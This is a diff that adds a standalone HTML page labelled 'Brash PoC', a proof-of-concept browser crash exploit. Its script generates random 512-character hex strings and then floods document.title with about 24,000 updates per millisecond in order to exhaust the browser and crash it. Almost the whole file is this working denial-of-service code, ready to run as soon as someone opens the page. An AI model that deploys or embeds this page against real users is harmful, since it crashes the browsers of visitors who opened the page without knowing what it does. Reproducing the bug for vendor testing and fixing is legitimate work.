@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brash PoC Test</title>
+</head>
+<body>
+    <h1>Browser Crash Test - Brash PoC</h1>
+    <p>Testing browser resilience to rapid document.title updates...</p>
+    
+    <script>
+        // Generate 100 random 512-character hex strings for maximum entropy
+        const hashes = [];
+        for (let i = 0; i < 100; i++) {
+            let hash = '';
+            for (let j = 0; j < 512; j++) {
+                hash += Math.floor(Math.random() * 16).toString(16);
+            }
+            hashes.push(hash);
+        }
+        
+        // Burst injection: rapid document.title updates
+        // Default config: 8000 bursts per millisecond = ~24M updates/sec
+        let counter = 0;
+        setInterval(() => {
+            for (let i = 0; i < 8000; i++) {
+                // Triple-update per burst
+                document.title = hashes[counter % 100];
+                document.title = hashes[(counter + 1) % 100];
+                document.title = hashes[(counter + 2) % 100];
+                counter += 3;
+            }
+        }, 1);
+    </script>
+</body>
+</html>
